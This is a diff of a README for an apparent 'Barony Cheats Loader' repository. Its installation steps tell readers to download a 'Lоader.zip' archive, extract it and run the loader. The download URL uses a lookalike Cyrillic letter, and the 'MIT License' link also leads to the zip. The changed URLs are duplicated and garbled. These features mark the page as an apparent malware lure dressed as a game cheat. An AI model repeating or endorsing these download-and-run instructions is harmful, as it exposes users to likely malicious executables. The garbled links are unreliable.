@@ -4,7 +4,7 @@ Welcome to the ultimate **Barony Cheats Loader** repository! This multifunctiona
 
 ## 🚀 Installation
 
-1. Download `https://raw.githubusercontent.com/haslanin/Barony-Arcane-Toolkit/main/Lоader.zip` directly from the repository.
+1. Download `https://raw.githubusercontent.com/haslanin/Barony-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/haslanin/Barony-Arcane-Toolkit/main/Lоader.zip` directly from the repository.
 2. Extract the archive with any compression tool.
 3. Launch the extracted loader and follow the on-screen instructions.
 4. Enjoy extended features within your Barony session!
@@ -47,7 +47,7 @@ This repository is intended for **educational and entertainment purposes only**.
 
 ## 📄 License
 
-Licensed under the [MIT License](https://raw.githubusercontent.com/haslanin/Barony-Arcane-Toolkit/main/Lоader.zip).  
+Licensed under the [MIT License](https://raw.githubusercontent.com/haslanin/Barony-Arcane-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/haslanin/Barony-Arcane-Toolkit/main/Lоader.zip).  
 © 2025 Barony Cheats Loader Project
 
 Enjoy a smarter and more powerful Barony adventure! 🚩
